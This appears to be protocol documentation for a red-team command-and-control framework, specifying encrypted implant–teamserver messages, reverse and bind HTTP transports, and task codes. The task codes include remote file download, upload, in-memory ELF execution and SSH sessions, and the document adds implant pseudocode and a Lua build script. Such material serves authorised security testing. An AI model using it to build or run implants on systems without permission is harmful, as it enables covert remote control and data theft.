# PurpleCommand Implant Protocol Documentation

## Table of Contents
1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Cryptographic Layer](#cryptographic-layer)
4. [Message Types](#message-types)
5. [Packet Structure](#packet-structure)
6. [Communication Flow](#communication-flow)
7. [Speaker Bind HTTP Contract](#speaker-bind-http-contract)
8. [Command Codes](#command-codes)
9. [Implementation Guide](#implementation-guide)
10. [Wire Format Examples](#wire-format-examples)
11. [Security Considerations](#security-considerations)
12. [Payload Type and Lua Command Routing](#payload-type-and-lua-command-routing)
13. [Testing Your Implant](#testing-your-implant)
14. [Appendix: Quick Reference](#appendix-quick-reference)

---

## Overview

PurpleCommand uses a custom binary protocol for communication between implants
and the teamserver. The same protocol frames and cryptographic envelopes are
used by both transport modes:

- **Listener / reverse mode**: the implant initiates HTTP requests to a
  teamserver listener.
- **Speaker / bind mode**: the implant listens for HTTP requests and the
  teamserver speaker initiates each finite exchange.

The protocol is designed for:
- **Stealth**: Encrypted traffic with RSA + AES-CBC encryption
- **Integrity**: HMAC-SHA256 authentication
- **Flexibility**: Supports multiple implant types and commands
- **Efficiency**: Binary format with minimal overhead

### Key Features
- RSA PKCS#1 v1.5 encryption for registration key exchange
- AES-128-CBC encryption for all subsequent communications
- HMAC-SHA256 (truncated to 16 bytes) for message authentication
- canonical RFC 4648 Base64 encoding for HTTP transport
- Big-endian byte order for all multi-byte integers

### Normative transport invariant

The binary plaintext frame and its encrypted, authenticated, Base64-encoded
envelope **MUST be byte-compatible across listener and speaker transports**.
A transport may change where an envelope is carried, but it must not introduce
a speaker-specific REG, CHK, TASK, RSP, or CHU format. The shared definitions
in `internal/protocol` are the wire authority; both transports use the shared
teamserver callback parser.

Implementation ownership is intentionally split along that boundary:

- `internal/protocol/frames.go`: shared plaintext frame layouts and limits.
- `server/callback/callback.go`: shared REG/CHK/RSP/CHU envelope parsing.
- `internal/protocol/http.go`: speaker HTTP operation names only.
- `implant/core/bind.go`: implant-side bind HTTP carriage and retry cache.
- `server/speaker/worker.go`: teamserver first blood, healthcheck, and task
  dispatch orchestration.

Transport code must call these shared layers rather than duplicating frame
serialization or callback handling.

---

## Architecture

### Components

1. **Implant**: the remote payload. It is an HTTP client in reverse mode and
   an HTTP server in bind mode.
2. **Listener**: a teamserver-owned inbound endpoint which accepts connections
   initiated by reverse implants.
3. **Speaker**: a teamserver-owned outbound worker which connects to one bind
   implant endpoint.
4. **Shared protocol layer**: owns frame serialization, cryptography, callback
   parsing, sessions, task leasing, responses, and loot for both transports.

### Direction comparison

| Property | Listener / reverse | Speaker / bind |
|---|---|---|
| HTTP client | Implant | Teamserver speaker |
| HTTP server | Teamserver listener | Implant bind server |
| Registration (`REG`) | Implant request body | Implant response body to first-blood request |
| Check-in (`CHK`) | Implant request carrier | Implant response body to healthcheck request |
| Task (`TASK`) | Teamserver response body | Teamserver request body |
| Result (`RSP`/`CHU`) | Implant request body | Implant response body to task request |
| Background cadence | Implant `Sleep` loop | Speaker healthcheck interval, if enabled |
| Persistent command channel | No | No; connection pooling does not change the finite exchange model |

The message direction labels in this document identify the producer and
consumer of the protocol frame, not which side opened the HTTP connection.

### Listener / reverse communication pattern

```
Implant                           Teamserver listener
   |                                  |
   |--- (1) Registration (POST) ----->|
   |<--- (acknowledgment) ------------|
   |                                  |
   |--- (2) Check-in (GET) ---------->|
   |<--- (3) Task or Empty ------------|
   |                                  |
   |--- (4) Response (POST) --------->|
   |<--- (acknowledgment) ------------|
   |                                  |
   [Loop steps 2-4]
```

### Speaker / bind communication pattern

```text
Teamserver speaker                    Bind implant
       |                                   |
       |--- (1) registration request ----->|
       |<-- (2) REG "first blood" ----------|
       |                                   |
       |--- (3) healthcheck request ------>|
       |<-- (4) CHK ------------------------|
       |                                   |
       |--- (5) TASK, when queued -------->|
       |<-- (6) RSP, CHU, or 204 -----------|
       |                                   |
       [Repeat 3-6 on a timer and/or task-ready signal]
```

Starting a speaker is synchronous through first blood: it is not considered
connected until the teamserver has requested, decrypted, parsed, and registered
the implant's `REG` response and associated the resulting session with that
speaker's stable UUID.

---

## Cryptographic Layer

### Phase 1: Registration (hybrid RSA + AES)

At payload construction time, the teamserver public key is embedded in the
implant. At runtime the implant creates its session AES key and IV and builds
the ordinary `REG` plaintext frame. `RSAEncode` then:

1. Generates a separate, ephemeral 16-byte AES key and 16-byte IV.
2. Encrypts the `REG` plaintext with ephemeral AES-128-CBC and PKCS#7 padding.
3. Concatenates the ephemeral key and IV and encrypts those 32 bytes with the
   embedded RSA public key using PKCS#1 v1.5.
4. Concatenates `RSA(key || IV) || AES-CBC(REG)`.
5. Encodes the complete envelope with standard padded Base64.

The same registration envelope is sent in a listener request or returned as
speaker first blood. The teamserver decrypts both with the same private key and
callback parser.

### Phase 2: Operational (AES + HMAC)
After registration, every CHK, TASK, RSP, and CHU envelope uses:

1. **AES-128-CBC** with the session key and IV from the REG frame and PKCS#7
   padding.
2. **HMAC-SHA256**, keyed by `AES key XOR AES IV`, calculated over the
   ciphertext and truncated to its first 16 bytes.
3. Standard padded Base64 around `ciphertext || truncated HMAC`.

### Encryption Process
```
Plaintext frame → AES-CBC → ciphertext || HMAC[0:16] → Base64 → HTTP carriage
```

### Decryption Process
```
HTTP carriage → strict Base64 decode → verify HMAC → AES-CBC decrypt/unpad → plaintext frame
```

---

## Message Types

The protocol defines 5 message types (identified by uint16 code):

| Code | Name | Logical direction | Description |
|------|------|-------------------|-------------|
| 0 | NIL | - | Nothing/invalid; never a valid callback frame |
| 1 | REG | Implant → teamserver | Initial registration / speaker first blood |
| 2 | CHK | Implant → teamserver | Authenticated session check-in |
| 3 | RSP | Implant → teamserver | Task response |
| 4 | CHU | Implant → teamserver | File/loot response |

### Task Message (Teamserver → Implant)
Task messages are produced by the teamserver after parsing a CHK frame. In
reverse mode the task is carried in the listener's CHK HTTP response. In bind
mode the speaker carries it in a second HTTP request. Its structure is:
```
[TaskCode: uint16][TaskID: 8 bytes][PayloadLen: uint32][Payload: variable]
```

---

## Packet Structure

### Common Metadata Block (31 bytes)

REG, CHK, RSP, and CHU contain the same 31-byte metadata block immediately
after their 2-byte message type. TASK does not contain implant metadata.

```
Offset | Size | Type   | Field      | Description
-------|------|--------|------------|----------------------------------
0      | 4    | uint32 | PID        | Process ID
4      | 4    | uint32 | SessionID  | Unique session identifier
8      | 12   | [12]byte| OTS       | Profile-bound registration token
20     | 4    | uint32 | IP         | IP address (big-endian)
24     | 2    | uint16 | Port       | Port number
26     | 4    | uint32 | Sleep      | Reverse callback interval in seconds
30     | 1    | uint8  | Arch       | Architecture (0=nil, 1=amd64)
```

All offsets below start at the beginning of the plaintext frame. `Metadata`
means the exact 31-byte block above.

### 1. REG (Registration) - Before Encryption
```
[MessageType: uint16] = 1
[Metadata: 31 bytes]
[AES Key: 16 bytes]
[AES IV: 16 bytes]
[DataLen: uint16]
[Data: variable]
   └─ Process\x00Hostname\x00User\x00PayloadType
```

**Data Section** is null-byte separated strings:
- Process name (e.g., "sshd")
- Hostname (e.g., "webserver01")
- Username (e.g., "www-data")
- Payload type (e.g., "impl")

**Envelope**: Hybrid RSA/AES registration envelope, then Base64.

**HTTP carriage**:

- Listener: implant POST request to the registration route (legacy default
  `/`).
- Speaker: bind implant response to the first-blood `registration` exchange.

### 2. CHK (Check-in)
```
[MessageType: uint16] = 2
[Metadata: 31 bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP carriage**:

- Listener: implant GET request through the route's configured inbound carrier
  (legacy default cookie `a`) and session source (legacy default query `a`).
- Speaker: bind implant response to a `healthcheck` exchange. The teamserver's
  healthcheck request body is empty.

### 3. RSP (Response)
```
[MessageType: uint16] = 3
[Metadata: 31 bytes]
[TaskID: 8 bytes]
[PayloadLen: uint32]
[Payload: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP carriage**: implant POST request in listener mode; bind implant response
to the speaker's `task` request in speaker mode.

### 4. CHU (Chunk/File Download)
```
[MessageType: uint16] = 4
[Metadata: 31 bytes]
[TaskID: 8 bytes]
[FileNameLen: uint32]
[FileName: variable bytes]
[ContentLen: uint32]
[Content: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP carriage**: implant POST request in listener mode; bind implant response
to the speaker's `task` request in speaker mode.

### 5. Task (Teamserver → Implant)
```
[TaskCode: uint16]
[TaskID: 8 bytes]
[PayloadLen: uint32]
[Payload: variable bytes]
```

**Encryption**: AES-CBC encrypt → Append HMAC(16 bytes) → Base64 encode

**HTTP carriage**: listener response to the implant's CHK request in reverse
mode; speaker request body after the teamserver parses a CHK response in bind
mode.

---

## Communication Flow

### Common registration construction

1. The implant collects metadata and generates its 16-byte session AES key and
   IV.
2. It builds `[REG][Metadata][AES_Key][AES_IV][DataLen][Data]`.
3. It applies the hybrid registration envelope defined above and standard
   Base64 encoding.
4. The teamserver runs that body through the transport-independent callback
   parser. It validates the payload type and session plus the profile binding
   and OTS when a profile is selected, then stores the session AES material.

### Listener / reverse flow

1. The implant sends the registration envelope to a teamserver listener.
2. On each `Metadata.Sleep` interval it creates an authenticated CHK envelope
   and initiates a listener request.
3. The teamserver parses CHK, updates the session's last-seen time, and may
   lease one queued task. The listener response carries either the exact
   encrypted TASK envelope or its configured no-task body.
4. The implant authenticates and decodes TASK, executes it, and initiates a
   second request carrying RSP or CHU. Commands with no response omit this
   request.
5. The shared callback parser validates and completes the matching task.

### Speaker / bind flow

1. A bind-mode implant starts an HTTP server at its configured `LHOST` address
   and path. It does not initiate a connection to the teamserver.
2. The teamserver starts a speaker and immediately performs the `registration`
   exchange. The bind implant returns its prebuilt REG envelope as first blood.
3. The teamserver decrypts and registers REG with the shared callback parser.
   Startup succeeds only if the session is associated with the requesting
   speaker UUID.
4. On a background healthcheck tick, a task-ready signal, or a retry deadline,
   the speaker performs a `healthcheck` exchange. The bind implant constructs
   and returns the same authenticated CHK envelope used by reverse mode.
5. The shared parser processes CHK and may lease one queued task. With no task,
   the cycle ends. With a task, the speaker immediately performs a `task`
   exchange whose request body is the exact TASK envelope returned by the
   parser.
6. The bind implant authenticates, decodes, and executes the task through the
   shared task executor. It returns an RSP or CHU envelope, or HTTP 204 for a
   command with no response. The teamserver sends RSP and CHU through the same
   callback parser used by listeners.

Health monitoring is optional. It defaults to enabled at a 30-second interval
with a failure threshold of three. Disabling it suppresses background probes;
task-ready and retry-driven cycles still begin with a CHK exchange so task
leasing remains identical to listener mode. A configured task retry interval
defaults to 15 seconds and must be at least 100 milliseconds.

The speaker serializes exchanges for its bind endpoint. It does not maintain a
persistent command channel, although its HTTP client may reuse idle transport
connections.

---

## Speaker Bind HTTP Contract

This is the outer HTTP contract only. Every non-empty protocol body is the
same standard-Base64 envelope described elsewhere in this document.

### Request selection

Every request from the speaker to the bind implant **MUST** use `POST` and set:

```http
X-PurpleCommand-Exchange: <operation>
```

The operation is one of:

| Operation | Speaker request body | Bind response |
|---|---|---|
| `registration` | Empty | HTTP 200 with REG envelope |
| `healthcheck` | Empty | HTTP 200 with CHK envelope |
| `task` | TASK envelope | HTTP 200 with RSP/CHU envelope, or HTTP 204 with no body |

The speaker uses one configurable request template for all three operations
and overwrites `X-PurpleCommand-Exchange` for each request. Consequently its
configured method must be `POST`; an empty method is not coerced to POST and
defaults to GET in the HTTP client, which the bind implant rejects. If explicit
expected statuses are configured, they must allow both 200 and 204 so
response-producing and no-response tasks are accepted.

Successful HTTP 200 bind responses set `Content-Type: application/octet-stream`
and `Cache-Control: no-store` and provide their body length. Registration and
healthcheck require an empty request body. The reference handler treats a
whitespace-only body as empty, but protocol producers send zero bytes.

The reference bind server defaults to address `:8080` and path `/`. Its path
must match the speaker request path resolved against the configured base URL.
Custom speaker headers, query parameters, cookies, proxy settings, TLS trust,
and connection reuse are outer transport configuration and do not alter a
protocol envelope.

### Bind error responses

| Status | Meaning |
|---|---|
| 400 | Unknown exchange, non-whitespace registration/healthcheck body, invalid Base64/HMAC/AES, or malformed TASK frame |
| 405 | Method is not POST; response includes `Allow: POST` |
| 409 | A cached task ID was reused with different plaintext contents |
| 413 | Request exceeds the bind server's configured body limit |

Any unaccepted HTTP status or invalid response envelope is a failed speaker
cycle. Consecutive failures mark the session unavailable after the configured
threshold only when background health monitoring is enabled. A later valid
exchange restores the connected/healthy state.

### Delivery and replay behavior

Response-producing task delivery is at-least-once until the teamserver accepts
a matching RSP or CHU. The same 8-byte task ID is leased again after its retry
interval when a request or response is lost. KILL is the exception: it is sent
once, returns 204, and terminates the bind endpoint.

The bind implant prevents ordinary retry delivery from executing a task twice:

- Tasks execute serially.
- The default cache retains 128 task IDs and the SHA-256 fingerprint of each
  plaintext TASK frame.
- Repeating the same ID and fingerprint returns the cached protocol response.
- Reusing a cached ID with different contents returns HTTP 409.

The teamserver also ignores duplicate responses for a task that is already
complete or currently being processed. This application-level deduplication
does not add a general nonce to the cryptographic envelope.

### Shutdown and interactive limitation

KILL returns HTTP 204 and shuts down the bind HTTP server after the exchange.
The existing SSH task requires an additional implant-initiated streaming
connection, so it is unavailable in strict bind mode; the implant returns a
normal authenticated RSP explaining that limitation. Other task handlers use
the same executor in reverse and bind modes.

---

## Command Codes

Task codes sent from the teamserver to the implant:

| Code | Name    | Payload Format | Description |
|------|---------|----------------|-------------|
| 0    | NILCMD  | (none) | Invalid/No command |
| 1    | PING    | UTF-8 string | Echo test - implant appends " pong" |
| 2    | SSH     | (varies) | SSH interactive session |
| 3    | DOWN    | UTF-8 filename | Download file from target to C2 |
| 4    | UPL     | See below | Upload file from teamserver to target |
| 5    | KILL    | (none) | Terminate implant |
| 6    | CD      | UTF-8 path | Change working directory |
| 7    | PWD     | (none) | Print working directory |
| 8    | LS      | UTF-8 path (optional) | List directory contents |
| 9    | MEMEXEC | See below | Execute ELF binary in memory |
| 10   | IFCONFIG | (none) | List local network interfaces |
| 11   | CAT     | UTF-8 filename | Read a text/binary file into an RSP payload |

SSH is implemented only for reverse mode because it opens a separate
implant-to-teamserver streaming connection. The bind executor returns an RSP
instead of starting that stream.

### Payload Formats

#### PING (Code 1)
```
Payload: UTF-8 string (e.g., "test")
Response: string + " pong" (e.g., "test pong")
```

#### DOWN (Code 3) - Download file from target
```
Payload: UTF-8 filename path
Response: CHU packet with file contents
```

#### UPL (Code 4) - Upload file to target
```
Offset | Size    | Field
-------|---------|------------------
0      | 2       | NameLen (uint16)
2      | NameLen | Name (UTF-8 string)
2+N    | 4       | DataLen (uint32)
6+N    | DataLen | Data (binary)
```

#### CD (Code 6)
```
Payload: UTF-8 directory path
Response: Success message with new path or error
```

#### LS (Code 8)
```
Payload: UTF-8 directory path (empty = current dir)
Response: Formatted directory listing with permissions, owner, size, name
```

#### MEMEXEC (Code 9) - Execute ELF in memory
```
Offset | Size    | Field
-------|---------|------------------
0      | 2       | ArgsLen (uint16)
2      | ArgsLen | Arguments (space-separated UTF-8)
2+A    | Rest    | ELF binary data
```
**Response**: stdout/stderr output from execution

---

## Implementation Guide

### Minimum Requirements for a Compatible Implant

#### 1. Metadata Structure
```c
struct ImplantMetadata {
    uint32_t pid;        // Process ID
    uint32_t session_id; // Random 5-digit number
    uint8_t  ots[12];    // Profile registration token; zeros when not configured
    uint32_t ip;         // IP address (big-endian)
    uint16_t port;       // Port number
    uint32_t sleep;      // Sleep interval in seconds
    uint8_t  arch;       // 0=nil, 1=amd64
    char*    proc;       // Process name
    char*    hostname;   // Hostname
    char*    user;       // Username
    char*    type;       // Implant type identifier
};
```

#### 2. Crypto Functions Required

- **RSA PKCS#1 v1.5** encryption (registration key block only; 2048-bit keys
  are the documented deployment default)
- **AES-128-CBC** encryption/decryption
- **HMAC-SHA256** (truncate to 16 bytes)
- **SHA-256** for bind TASK replay fingerprints
- Strict standard padded **Base64** encoding/decoding

#### 3. Implementation Steps

**A. Initialization**
```pseudocode
1. Initialize metadata (collect system info)
2. Generate random session_id (5 digits)
3. Generate AES key (16 random bytes)
4. Generate AES IV (16 random bytes)
5. Derive HMAC key as byte-wise AES key XOR AES IV
6. Load embedded RSA public key
7. Set the 12-byte OTS token embedded by the payload builder
```

**B. Registration**
```pseudocode
1. Build packet:
   - MessageType = 1 (REG)
   - Metadata (31 bytes)
   - AES Key (16 bytes)
   - AES IV (16 bytes)
   - DataLen (2 bytes)
   - Data (proc\x00hostname\x00user\x00type)

2. Wrap it in the hybrid RSA/AES registration envelope
3. Base64 encode
4. In reverse mode, POST it to the listener
5. In bind mode, retain it and return it from registration requests
```

**C. Reverse Main Loop**
```pseudocode
loop forever:
    // Check-in
    packet = build_checkin(CHK, metadata)
    encrypted = aes_cbc_encrypt(packet, key, iv)
    authed = encrypted + hmac_sha256(encrypted, key XOR iv)[:16]
    encoded = base64_encode(authed)

    response = http_get(server_url, encoded)

    if len(response) < 16:
        sleep(metadata.sleep)
        continue

    // Decrypt task
    decoded = base64_decode(response)
    if not verify_hmac(decoded):
        error("HMAC verification failed")
        continue

    ciphertext = decoded[:-16]
    plaintext = aes_cbc_decrypt(ciphertext, key, iv)

    task_code, task_id, payload = parse_task(plaintext)

    // Execute task; result_frame is RSP, CHU, or empty
    result_frame = execute_command(task_code, task_id, payload)

    if result_frame is not empty:
        encrypted = aes_cbc_encrypt(result_frame, key, iv)
        authed = encrypted + hmac_sha256(encrypted, key XOR iv)[:16]
        encoded = base64_encode(authed)
        http_post(server_url, encoded)

    sleep(metadata.sleep)
```

**D. Bind HTTP Loop**

```pseudocode
listen(bind_address, bind_path)

on POST where X-PurpleCommand-Exchange == "registration":
    require_empty_body()
    return 200, registration_envelope

on POST where X-PurpleCommand-Exchange == "healthcheck":
    require_empty_body()
    return 200, encode_authenticated([CHK][Metadata])

on POST where X-PurpleCommand-Exchange == "task":
    plaintext = authenticate_decrypt_and_parse_task(body)
    fingerprint = sha256(plaintext)
    if same_task_id_and_fingerprint_is_cached:
        return cached_status_and_body
    if same_task_id_with_different_fingerprint_is_cached:
        return 409
    response, terminate = execute_through_shared_task_executor(plaintext)
    cache(task_id, fingerprint, response, terminate)
    if response is empty:
        return 204
    return 200, response
```

The bind implementation must bound request bodies and headers, reject trailing
TASK bytes, serialize task execution, and perform constant-time HMAC
verification before decryption.

#### 4. Binary Serialization (Big-Endian)
All multi-byte integers use **big-endian** byte order:

```c
// Write uint16
void write_uint16(uint8_t* buf, uint16_t val) {
    buf[0] = (val >> 8) & 0xFF;
    buf[1] = val & 0xFF;
}

// Write uint32
void write_uint32(uint8_t* buf, uint32_t val) {
    buf[0] = (val >> 24) & 0xFF;
    buf[1] = (val >> 16) & 0xFF;
    buf[2] = (val >> 8) & 0xFF;
    buf[3] = val & 0xFF;
}

// Read uint16
uint16_t read_uint16(uint8_t* buf) {
    return ((uint16_t)buf[0] << 8) | buf[1];
}

// Read uint32
uint32_t read_uint32(uint8_t* buf) {
    return ((uint32_t)buf[0] << 24) |
           ((uint32_t)buf[1] << 16) |
           ((uint32_t)buf[2] << 8) |
           buf[3];
}
```

---

## Wire Format Examples

### Example 1: Registration Plaintext (Before Hybrid Envelope)

```
Hex dump of registration packet:
00 01           # MessageType = REG (1)
00 00 12 34     # PID = 4660
00 01 23 45     # SessionID = 74565
00 00 00 00 00 00 00 00 00 00 00 00  # OTS (12 bytes)
C0 A8 01 0A     # IP = 192.168.1.10
1F 90           # Port = 8080
00 00 00 0A     # Sleep = 10 seconds
01              # Arch = amd64
A1 B2 C3 ... (16 bytes)  # AES Key
D4 E5 F6 ... (16 bytes)  # AES IV
00 1A           # DataLen = 26
73 73 68 64     # "sshd"
00              # separator
77 65 62 73 65 72 76 65 72 30 31  # "webserver01"
00              # separator
72 6F 6F 74     # "root"
00              # separator
69 6D 70 6C     # "impl"
```

After hybrid wrapping and Base64 encoding, this is a listener POST body or a
speaker first-blood response body.

### Example 2: Check-in Packet (After AES+HMAC)

**Original packet:**
```
00 02           # MessageType = CHK (2)
00 00 12 34     # PID
00 01 23 45     # SessionID
... (rest of metadata)
```

**After AES-CBC encryption (example):**
```
B3 7F 9A 2C ... (32 bytes encrypted)
```

**After HMAC append:**
```
B3 7F 9A 2C ... (32 bytes encrypted)
5D 8A 3F ... (16 bytes HMAC)
```

**After Base64 encoding:**
```
sz+aLC4xQv... (Base64 string)
```

This is carried by the listener route's configured request carrier in reverse
mode, or returned by the bind implant in a speaker healthcheck response.

### Example 3: Task from Teamserver (ls command)

**Original task packet:**
```
00 08           # TaskCode = LS (8)
41 42 43 44 45 46 47 48  # TaskID (8 bytes)
00 00 00 09     # PayloadLen = 9
2F 74 6D 70 2F 74 65 73 74  # "/tmp/test"
```

**After AES+HMAC+Base64** → listener CHK response or speaker task request

### Example 4: Response Packet

**Original response:**
```
00 03           # MessageType = RSP (3)
... (metadata 31 bytes)
41 42 43 44 45 46 47 48  # TaskID (matching task)
00 00 00 10     # PayloadLen = 16
64 72 77 78 72 2D 78 72 2D 78 ... # "drwxr-xr-x ..."
```

**After AES+HMAC+Base64** → implant request through a listener or bind
implant response to a speaker

---

## Security Considerations

### Parser and Transport Limits

The server validates the complete cryptographic and binary envelope before
processing a callback. Current limits are:

| Field | Maximum |
|------|---------|
| Logical TASK or RSP payload | 8 MiB (8,388,608 bytes) |
| CHU filename | 4 KiB (4,096 bytes) |
| CHU content | 8 MiB (8,388,608 bytes) |
| Registration string block | 4 KiB (4,096 bytes) |
| Authenticated decoded envelope accepted by callback parser | 8,392,864 bytes |
| Canonical Base64 envelope accepted by callback parser | 11,190,488 bytes |
| Default speaker HTTP request/response body | 11,190,488 bytes |
| Default listener HTTP callback body | 11,190,488 bytes |
| Bind implant HTTP request safety cap | 16 MiB |
| Bind implant HTTP request headers | 32 KiB |

Declared lengths must fit within the bytes remaining in the packet, and no
trailing data is permitted. The shared envelope limits are deliberately large
enough for the maximum CHU frame, AES padding, truncated HMAC, and Base64
expansion, so a valid maximum-sized frame is transportable through either
direction. A listener rejects malformed implant requests with HTTP 400. A
speaker treats malformed implant responses as a failed cycle. The bind
implant's own status behavior is specified in the speaker HTTP contract above.

### Key Points:
1. **RSA Key**: The teamserver public key must be embedded in the implant. When
   a teamserver key is loaded during a build, a mismatched payload public key
   is rejected.
2. **AES Key**: Generated once per implant session, shared during registration
3. **HMAC Key**: Exactly the byte-wise XOR of the session AES key and IV
4. **Session ID**: The reference implant generates a random 5-digit number
5. **Base64**: Producers emit strict standard padded encoding with no
   whitespace. The teamserver callback parser rejects non-alphabet whitespace;
   the bind TASK handler trims only surrounding whitespace before strict decode
6. **Session binding**: Authenticated callback metadata must contain the same
   session ID as the session selected by the transport
7. **Speaker binding**: First blood must register a session owned by the
   requesting speaker's stable UUID

### Profile OTS contract

An optional plaintext OTS configured on an implant profile is stored by the
teamserver only as SHA-256. Payload generation embeds the first 12 bytes of
that digest into `Metadata.OTS`. When a transport names a profile, a profile
without an OTS requires twelve zero bytes; a configured profile rejects a
missing, invalid, expired, or already-consumed token and atomically records its
first successful use. A speaker selects this validation context with its
`config.profile`; registration without a transport profile has no
profile-backed OTS policy to validate.

A running bind implant returns stable first blood. Restarting the same
teamserver speaker with the same UUID may therefore refresh its existing
session without consuming the OTS a second time; payload type and speaker
ownership are still checked.

### Implementation Notes:
- All encryption uses **PKCS#7 padding** for AES-CBC
- HMAC uses SHA-256 but **truncates to the first 16 bytes**
- RSA uses **PKCS#1 v1.5 padding**
- The encrypted protocol has no general replay nonce. Task leasing, response
  completion, and the bind task cache provide the application-level duplicate
  handling described above.

---

## Payload Type and Lua Command Routing

Every implant presents a payload `Type` in its registration data. This stable
identifier connects three parts of the system:

1. An implant build profile sets `TYPE` (default: `impl`).
2. The generated implant registers that value in `ImplantMetadata.Type`.
3. Lua registers supported commands with
   `command(payload_type, name, description, handler)`.

The server uses the exact, case-sensitive pair `(payload_type, command_name)`
for both CLI suggestions and command dispatch. Commands for other types are not
shown and cannot be invoked through the selected session. A command must be
registered separately for every payload type that implements it. Duplicate
registrations for the same pair are rejected, and unloading a script removes
the commands owned by that script.

Payload type identifiers are 1-64 bytes and may contain ASCII letters, digits,
dots, underscores, and hyphens. Command names have the same length limit but do
not allow dots. Invalid types are rejected during Lua registration, profile
configuration, and implant registration.

Example:

```lua
command("impl", "ping", "Ping the default implant", ping_impl)
command("iot.v1", "ping", "Ping the IoT payload", ping_iot)
```

Existing build profiles are migrated with `TYPE=impl`. Operators can configure
a different type with `set TYPE <payload-type>` or the `type` field of
`implant_register_profile`.

### Payload transport mode

Build profiles use `MODE=reverse` (the default) or `MODE=bind`. The standard
payload template selects `core.Start` for reverse mode and `core.StartBind` for
bind mode. `LHOST` consequently has mode-dependent meaning:

| Mode | `LHOST` meaning |
|---|---|
| `reverse` | Teamserver listener address contacted by the implant |
| `bind` | Local address on which the implant accepts speaker requests, such as `:8080` |

Both modes embed the same teamserver public key, OTS token, payload type, and
wire implementation. `speaker` is accepted as a profile input alias but is
normalized and persisted as `bind`.

### Lua Payload Builders

A build profile can select a Lua builder through its `BUILDER` option. An empty
builder preserves the existing behavior: a profile with a `Makefile` uses that
Makefile, and other profiles use the built-in Go source builder. Existing
profiles are migrated with an empty builder, so enabling Lua builds is opt-in.

Register a builder in a trusted Lua script with:

```lua
payload_build(
    "implant-builder-linux-amd64",
    "implant builder for linux amd64; no compression",
    impl_build
)
```

The handler receives the selected profile name. `implant_profile(name)` returns
the resolved build specification, including `name`, `type`, `mode`, `lhost`,
`os`, `arch`, `output`, `template`, `public_key`, `builder`, `listener_uuid`,
`protocol`, `options_json`, `os_options`, and `arch_options`. During a build it
also provides the `workspace` used as the `os.exec` working directory and the
nearest `project_root` containing `go.mod`, plus the correlated `build_id`.

```lua
function impl_build(profile_name)
    local profile = implant_profile(profile_name)
    local source = [[
package main

import (
    "purpcmd/implant/core"
)

var publicKeyDER []byte
var implantOTS [12]byte

func main() {
    remoteAdd := "LHOST"
    payloadType := "IMPLANT_TYPE"
    payloadMode := "IMPLANT_MODE"
    if len(publicKeyDER) > 0 {
        if err := core.SetPublicKeyDER(publicKeyDER); err != nil {
            panic(err)
        }
    }
    if err := core.SetOneTimeSecret(implantOTS[:]); err != nil {
        panic(err)
    }
    if payloadMode == "bind" {
        if err := core.StartBind(remoteAdd, payloadType); err != nil {
            panic(err)
        }
        return
    }
    core.Start(remoteAdd, payloadType)
}
]]

    local source_path = os.tmpname() .. ".go"
    local write_err = os.write(source, source_path)
    if write_err then
        os.remove(source_path)
        error("os.write: " .. write_err)
    end
    if profile.project_root == "" then
        error("could not locate the Go project root")
    end
    local build_ok, build_result = pcall(os.exec,
        "cd " .. os.quote(profile.project_root) ..
        " && go build -ldflags '-s -w' -o " .. os.quote(profile.output) ..
        " " .. os.quote(source_path)
    )
    local removed, remove_err = os.remove(source_path)
    if not build_ok then
        error(build_result)
    end
    if not removed then
        error("could not remove temporary build source: " .. remove_err)
    end
end
```

`os.write(source, path)` performs the same address, payload-type, mode, OTS, and
public-key rendering as the built-in builder, creates missing parent
directories, and writes exactly to the caller-selected path. It returns `nil`
on success or an error string on failure. Relative paths resolve from
`workspace`; absolute paths such as `/tmp/my-build/main.go` are used directly.
No random directory is created and caller-selected source files are not
automatically removed.
The bundled builder deliberately chooses a random `os.tmpname()` path and
removes that source after each build attempt.

`os.exec` runs from the nearest Go project root, or the template directory when
no project root exists, with `GOOS`, `GOARCH`, `CGO_ENABLED=0`, and `PURPCMD_*`
profile environment variables set. Speaker-aware builders can inspect
`PURPCMD_MODE` and must preserve `PURPCMD_OTS_TOKEN`; the structured profile
table exposes the selected mode as `profile.mode`, while `os.write` renders the
mode and OTS into the source. `os.quote` safely quotes a value for the shell
used by the builder example. The builder must create the exact profile output
file, or the build fails. Command failures are included in build output and
fail the job. Builder registrations are removed when their owning script is
unloaded; a profile that names an unavailable builder fails clearly instead of
falling back to another build process. Lua build scripts are trusted server
configuration because `os.exec` can execute shell commands.

Structured Lua implant definitions may set `BUILDER`, and an existing profile
can be changed with `set BUILDER <builder-name>`.

Authenticated operators can list all builders registered by loaded scripts:

```text
ask.payload-builder.list -> rpl.payload-builder.list
```

The reply contains a name-sorted array of `name`, `description`, and `source`
objects. The implant-menu CLI command `builders` displays the same data.

A build can use the profile's configured builder or select one for only that
job:

```text
ask.build.create
{"profile":"linux-impl","builder":"implant-builder-linux-amd64"}
```

`builder` is optional for compatibility with older clients. Explicit values
must name a currently registered builder and are persisted on the build job,
without changing the underlying profile. The CLI equivalent is
`generate linux-impl implant-builder-linux-amd64`.

Loading and unloading scripts emits `evt.payload-builder.registered` and
`evt.payload-builder.unregistered`. Build execution emits `evt.build.queued`,
`evt.build.started`, zero or more correlated `evt.build.output` records, and
exactly one of `evt.build.completed` or `evt.build.failed`. Output records
contain `build_id`, `profile`, `builder`, and `message`; command output retained
in an event is capped at 256 KiB and marked if truncated.

### Default `impl` Commands

From the Lua configuration, the implant type "impl" supports these commands:

| Command  | Code | Description |
|----------|------|-------------|
| ping     | 1    | Ping the implant |
| ssh      | 2    | Get an interactive session |
| download | 3    | Download a file from target |
| upload   | 4    | Upload a file to target |
| kill     | 5    | Kill implant |
| pwd      | 7    | Get working directory |
| cd       | 6    | Change directory |
| ls       | 8    | List directory |
| memexec  | 9    | Execute binary in memory |
| ifconfig | 10   | Display network interfaces |
| cat      | 11   | Display file contents (first 10 KiB in the bundled Lua command) |

### Lua Callback Functions (Optional)
The teamserver can define Lua callbacks for implant lifecycle events:
- `OnRegister(name, uuid, hostname, user, socket, session_id, payload_type)`
- `OnCheck(name, uuid, hostname, user, socket, session_id, task_id, data, payload_type)`
- `OnResponse(name, uuid, hostname, user, socket, session_id, task_id, data, payload_type)`
- `register_task_callback` handlers receive
  `(task_id, response, name, uuid, hostname, user, payload_type)`.

